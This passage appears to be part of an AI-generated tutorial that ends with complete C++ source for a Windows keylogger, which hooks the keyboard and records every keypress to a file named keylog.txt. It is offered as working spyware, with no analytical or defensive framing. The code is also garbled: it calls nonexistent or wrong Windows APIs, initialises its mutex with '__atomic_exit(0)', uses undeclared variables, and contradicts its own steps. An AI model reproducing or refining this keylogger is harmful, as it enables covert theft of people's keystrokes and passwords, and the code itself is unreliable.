7. **Handle the Hook in a Separate Thread:**
   - To avoid blocking the main thread, run the hook in a separate thread using `CreateThread`.

8. **Implement the Main Function:**
   - Use `WinMain` to initialize the hook and start the thread.

Here's the complete code:

```c++
#include <windows.h>
#include <iostream>
#include <thread>
#include <string>
#include <fstream>

using namespace std;

void logKeyPress(char key, int modifiers, bool isKeyDown);
void keyboardHookProc(int nCode, int wParam, int lParam);
void installKeyboardHook();
void uninstallKeyboardHook();
string currentKey = "";
string lastKey = "";
string logFile = "keylog.txt";

// Initialize the hook
bool isHooked = false;

// Mutex to protect against concurrent access to log file
mutex logMutex = __atomic_exit(0);

// Function to log key presses
void logKeyPress(char key, int modifiers, bool isKeyDown) {
    if (isKeyDown) {
        currentKey = string(1, key);
        // Log the key with modifiers if applicable
        if (modifiers != 0) {
            // For example, if Shift is pressed
            currentKey += " + Shift";
        }
        if (modifiers & 0x0200) // Ctrl
            currentKey += " + Ctrl";
        if (modifiers & 0x0100) // Alt
            currentKey += " + Alt";
        // Add other modifiers as needed
    } else {
        currentKey = "";
    }
    // Write to file or other storage
    {
        lock_guard lock(logMutex);
        ofstream file(logFile, ios::app);
        file << currentKey << endl;
    }
}

// Callback function for the keyboard hook
void keyboardHookProc(int nCode, int wParam, int lParam) {
    if (nCode == HC_KEY && wParam != 0) { // Key down event
        int modifiers = GetAsyncKeyState(0x01001000); // Check for Shift, Ctrl, Alt
        if (wParam & 0x00000001) { // Key is pressed
            logKeyPress(wParam, modifiers, true);
        }
    }
}

// Install keyboard hook
void installKeyboardHook() {
    globalKeyboardHook = SetWindowsHook(WH_KEYBOARD, keyboardHookProc);
    if (!isHooked) {
        isHooked = true;
        cout << "Keyboard hook installed" << endl;
    }
}

// Uninstall keyboard hook
void uninstallKeyboardHook() {
    if (globalKeyboardHook) {
        UnhookKeyboard(globalKeyboardHook);
        isHooked = false;
        cout << "Keyboard hook uninstalled" << endl;
    }
}

int main() {
    // Start the hook in a separate thread
    thread t1(thread(&installKeyboardHook));
    t1.detach();

    // Wait for the hook to be installed
    while (!isHooked) {
        sleep(100);
    }

    // Keep the main thread alive
    while (true) {
        sleep(100);
    }
    return 0;
}
```

